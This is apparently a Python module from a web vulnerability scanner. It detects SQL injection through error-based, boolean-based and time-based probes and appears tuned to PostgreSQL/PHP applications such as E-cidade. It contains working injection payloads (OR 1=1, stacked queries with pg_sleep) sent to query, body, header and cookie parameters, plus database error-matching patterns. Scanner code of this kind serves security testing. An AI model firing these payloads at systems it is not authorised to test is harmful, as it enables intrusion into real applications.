import time
import re
from typing import List, Any, Dict

import requests

from core.request_rebuilder import rebuild_attack_request
from core.vulnerability import Vulnerability
from scanners.IScanModule import IScanModule, RequestNode, InjectionPoint

OASTClient = Any


class SqlInjectionModule(IScanModule):
    """Detecta SQLi (error-based + time-based) em pontos de injecao."""

    SQL_ERROR_PATTERNS = [
        r"(?i)sql\s+syntax",
        r"(?i)mysql_",
        r"(?i)you have an error in your sql",
        r"(?i)postgresql.*error",
        r"(?i)syntax error at or near",
        r"(?i)unterminated quoted string",
        r"(?i)division by zero",
        r"(?i)invalid input syntax for (?:type )?integer",
        r"(?i)pg_query",
        r"(?i)pg_exec",
        r"(?i)pg_",
        r"(?i)microsoft sql server",
        r"(?i)odbc driver",
        r"(?i)ora-\d{5}",
        r"(?i)sqlite.*error",
        r"(?i)sqlstate\[\w+\]",
        r"(?i)erro.*banco",
        r"(?i)erro.*sql",
        r"(?i)erro.*query",
        r"(?i)db_query",
        r"(?i)erro_status",
        r"(?i)fatal.*error.*pg_",
        r"(?i)warning.*pg_",
    ]

    def run_test(
        self,
        request_node: RequestNode,
        injection_point: InjectionPoint,
        oast_client: OASTClient
    ) -> List[Vulnerability]:
        relevant_locations = {'QUERY', 'BODY_FORM', 'BODY_FORM_JSON', 'BODY_JSON', 'HEADER', 'COOKIE'}
        if injection_point['location'] not in relevant_locations:
            return []

        session = requests.Session()
        session.verify = False
        session.timeout = 7

        original_value = str(injection_point.get('original_value', ''))
        is_numeric = self._is_numeric(original_value)
        num_val = original_value if is_numeric else "1"

        # Error-based payloads
        # Inclui testes com aspas e testes numéricos livres de aspas (especiais para PostgreSQL / E-cidade)
        error_payloads = [
            "'",
            '"',
            "'-- ",
            "\")",
            "' OR '1'='1'-- ",
            f"{num_val}/0",
            f"{num_val}); SELECT 1/0; -- ",
            f"{num_val} AND 1=CAST(chr(118)||chr(117)||chr(108)||chr(110) AS integer)",
            f"{num_val}) OR 1=1-- ",
            f"{num_val} OR 1=1-- ",
        ]
        if is_numeric:
            error_payloads = [f"{original_value}'"] + error_payloads

        for payload in error_payloads:
            try:
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                response = session.send(request_to_send, timeout=session.timeout, allow_redirects=False)
                if self._has_sql_error(response.text):
                    snippet = self._extract_error_snippet(response.text)
                    return [
                        Vulnerability(
                            name="SQL Injection (Error-Based)",
                            severity="High",
                            description=(
                                "SQL Injection detectada por mensagens de erro no response. "
                                f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Match: {snippet}",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        boolean_payloads = self._boolean_payloads(original_value, is_numeric)
        boolean_vuln = self._check_boolean_based(session, request_node, injection_point, boolean_payloads)
        if boolean_vuln:
            return [boolean_vuln]

        # Time-based payloads especializados para PostgreSQL / PHP (pg_query) e E-cidade
        # 1. Subconsultas em inteiros (funciona em argumentos de função fc_*, WHERE id = ..., etc.)
        # 2. Stacked queries com e sem fechamento de parênteses (nativas no pg_query do PHP)
        # 3. Injeções em strings e fallback MySQL
        time_payloads = [
            f"{num_val} + (SELECT 0 FROM pg_sleep(3))",
            f"(SELECT {num_val} FROM pg_sleep(3))",
            f"{num_val}); SELECT pg_sleep(3); -- ",
            f"{num_val}; SELECT pg_sleep(3); -- ",
            f"{num_val}) as x; SELECT pg_sleep(3); -- ",
            f"{original_value}' AND 1=(SELECT 1 FROM pg_sleep(3))-- ",
            f"{original_value}'; SELECT pg_sleep(3); -- ",
            f"{original_value}' OR 1=(SELECT 1 FROM pg_sleep(3))-- ",
            f"'{original_value}'; SELECT pg_sleep(3); -- ",
            f"{original_value}' AND SLEEP(3)-- ",
        ]

        for payload in time_payloads:
            try:
                start = time.time()
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                session.send(request_to_send, timeout=session.timeout, allow_redirects=False)
                elapsed = time.time() - start
                if elapsed >= 3.0:
                    # Confirmação contra falso positivo: valida se a requisição normal é mais rápida
                    try:
                        t_base_start = time.time()
                        base_req = rebuild_attack_request(request_node, injection_point, original_value)
                        session.send(base_req, timeout=session.timeout, allow_redirects=False)
                        base_elapsed = time.time() - t_base_start
                    except Exception:
                        base_elapsed = 0.0

                    # Só confirma se o atraso for genuinamente superior ao baseline da aplicação
                    if elapsed >= (base_elapsed + 2.5) or base_elapsed < 1.0:
                        return [
                            Vulnerability(
                                name="SQL Injection (Time-Based)",
                                severity="High",
                                description=(
                                    "SQL Injection detectada por atraso na resposta via PostgreSQL pg_sleep. "
                                    f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                                ),
                                evidence=f"Payload: {payload} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)",
                                request_node_id=request_node['id'],
                                injection_point_id=injection_point['id']
                            )
                        ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        return []

    def _boolean_payloads(self, original_value: str, is_numeric: bool):
        if is_numeric:
            return [
                (f"{original_value} AND 1=1", f"{original_value} AND 1=2"),
                (f"{original_value} OR 1=1", f"{original_value} AND 1=2"),
            ]
        return [
            ("' AND '1'='1'-- ", "' AND '1'='2'-- "),
            ('" AND "1"="1"-- ', '" AND "1"="2"-- '),
        ]

    def _check_boolean_based(self, session, request_node, injection_point, payload_pairs):
        try:
            base_request = rebuild_attack_request(request_node, injection_point, str(injection_point.get('original_value', '')))
            base_response = session.send(base_request, timeout=session.timeout, allow_redirects=False)
            base_body = base_response.text or ""
        except requests.exceptions.RequestException:
            return None

        for true_payload, false_payload in payload_pairs:
            try:
                true_request = rebuild_attack_request(request_node, injection_point, true_payload)
                false_request = rebuild_attack_request(request_node, injection_point, false_payload)
                true_response = session.send(true_request, timeout=session.timeout, allow_redirects=False)
                false_response = session.send(false_request, timeout=session.timeout, allow_redirects=False)
            except requests.exceptions.RequestException:
                continue

            base_len = len(base_body)
            true_len = len(true_response.text or "")
            false_len = len(false_response.text or "")
            true_delta = abs(base_len - true_len)
            false_delta = abs(base_len - false_len)
            threshold = max(30, int(max(base_len, 1) * 0.08))

            true_like_base = true_response.status_code == base_response.status_code and true_delta <= threshold
            false_different = (
                false_response.status_code != base_response.status_code
                or false_delta > threshold
                or self._body_similarity(base_body, false_response.text or "") < 0.85
            )

            if true_like_base and false_different:
                return Vulnerability(
                    name="SQL Injection (Boolean-Based)",
                    severity="High",
                    description=(
                        "SQL Injection booleana detectada por diferenca entre respostas TRUE/FALSE. "
                        f"Payload TRUE '{true_payload}' e FALSE '{false_payload}' em "
                        f"'{injection_point['parameter_name']}'."
                    ),
                    evidence=(
                        f"Payload TRUE: {true_payload} | Payload FALSE: {false_payload} | "
                        f"Status base/true/false: {base_response.status_code}/"
                        f"{true_response.status_code}/{false_response.status_code} | "
                        f"Tamanho base/true/false: {base_len}/{true_len}/{false_len}"
                    ),
                    request_node_id=request_node['id'],
                    injection_point_id=injection_point['id']
                )
        return None

    def _body_similarity(self, left: str, right: str) -> float:
        if left == right:
            return 1.0
        if not left or not right:
            return 0.0
        left_set = set(left.split())
        right_set = set(right.split())
        if not left_set or not right_set:
            return 0.0
        return len(left_set & right_set) / len(left_set | right_set)

    def _is_numeric(self, value: str) -> bool:
        return bool(re.fullmatch(r"-?\d+(\.\d+)?", str(value).strip()))

    def _has_sql_error(self, body: str) -> bool:
        return any(re.search(pattern, body or "") for pattern in self.SQL_ERROR_PATTERNS)

    def _extract_error_snippet(self, body: str) -> str:
        text = body or ""
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, text)
            if match:
                start = max(match.start() - 80, 0)
                end = min(match.end() + 80, len(text))
                return text[start:end]
        return text[:200]
